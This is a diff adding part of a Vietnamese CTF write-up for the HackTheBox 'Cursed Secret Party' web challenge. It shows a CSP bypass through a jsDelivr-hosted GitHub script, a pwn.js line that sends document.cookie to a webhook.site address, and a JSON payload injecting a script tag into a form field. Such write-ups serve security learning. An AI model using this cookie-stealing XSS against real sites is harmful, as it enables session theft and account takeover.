@@ -115,7 +115,6 @@ router.get('/admin', AuthMiddleware, (req, res) => {
                     <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
                     <p class="card-text"><strong>Costume Type </strong>   : {{ request.costume_type }} </p>
                     <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>
-                    
                     <button class="btn btn-primary">Accept</button>
                     <button class="btn btn-danger">Delete</button>
                 </div>
@@ -144,3 +143,22 @@ app.use(function (req, res, next) {
 ```
 - Nhưng nó lại cho phép chạy script từ https://cdn.jsdelivr.net , và thật trùng hợp, chúng ta có thể dùng file github qua cdn này với endpoint /gh/user/repo@version/file.js  
 - Tạo file pwn.js trên repo github
+```js
+window.location = 'https://webhook.site/7752b385-e4e8-4daa-a67a-f14dfcd558ce/cookie=' + document.cookie;
+```
+- Gửi payload tương ứng
+```json
+
+{
+  "halloween_name":"<script src='https://cdn.jsdelivr.net/gh/d4ngvn/CTF_WRITEUP@main/HackTheBox/Web/Very%20Easy/Cursed%20Secret%20Party/pwn.js'></script>",
+  "email":"admin@gmail.cm",
+  "costume_type":"monster",
+  "trick_or_treat":"tricks"
+}
+
+```
+![alt text](image-2.png)
+![alt text](image.png)
+- Decode flag 
+![alt text](image-3.png)
+
